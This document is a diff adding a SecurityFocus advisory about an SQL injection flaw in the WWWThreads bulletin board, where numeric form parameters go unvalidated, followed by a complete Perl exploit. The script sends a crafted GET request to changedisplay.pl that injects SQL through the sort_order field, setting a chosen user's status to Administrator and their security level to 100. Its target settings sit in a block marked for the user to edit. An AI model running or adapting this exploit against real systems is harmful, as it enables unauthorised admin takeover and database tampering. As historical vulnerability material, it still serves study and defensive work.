@@ -1,0 +1,49 @@
+source: http://www.securityfocus.com/bid/967/info
+
+
+WWWThreads is a web bulletin board program that uses an SQL backend. Due to incomplete input validation, it is possible for an attacker to submit SQL commands through forms and manipulate the contents of the database to gain administrator privileges over the database.
+
+There are various ways for a program to ensure that all entries into data fields are interpreted as data and not SQL commands. WWWThreads uses the quote() function to do this on string values, but fails to verify numeric values in a similar manner. Therefore, SQL commands can be passed to WWWThreads via any numeric argument. These commands can be used to update the status of any user to Administrator and change their security level to '100' (the same level as the Administrator). 
+
+#!/usr/bin/perl
+# wwwthreads hack by rfp@wiretrip.net
+# elevate a user to admin status
+#
+# by rain forest puppy / rfp@wiretrip.net
+use Socket;
+
+#####################################################
+# modify these
+
+# can be DNS or IP address
+$ip="localhost";
+
+$username="rfp";
+# remember to put a '\' before the '$' characters
+$passhash="\$1\$V2\$sadklfjasdkfhjaskdjflh";
+
+#####################################################
+
+$parms="Cat=&Username=$username&Oldpass=$passhash".
+"&sort_order=5,U_Status%3d'Administrator',U_Security%3d100".
+"&display=threaded&view=collapsed&PostsPer=10".
+"&Post_Format=top&Preview=on&TextCols=60&TextRows=5&FontSize=0".
+"&FontFace=&PictureView=on&PicturePost=off";
+
+$tosend="GET /cgi-bin/wwwthreads/changedisplay.pl?$parms HTTP/1.0\r\n".
+"Referer: http://$ip/cgi-bin/wwwthreads/previewpost.pl\r\n\r\n";
+
+print sendraw($tosend);
+
+sub sendraw {
+        my ($pstr)=@_; my $target;
+        $target= inet_aton($ip) || die("inet_aton problems");
+        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
+                die("Socket problems\n");
+        if(connect(S,pack "SnA4x8",2,80,$target)){
+                select(S);              $|=1;
+                print $pstr;            my @in=<S>;
+                select(STDOUT);         close(S);
+                return @in;
+        } else { die("Can't connect...\n"); }}
+
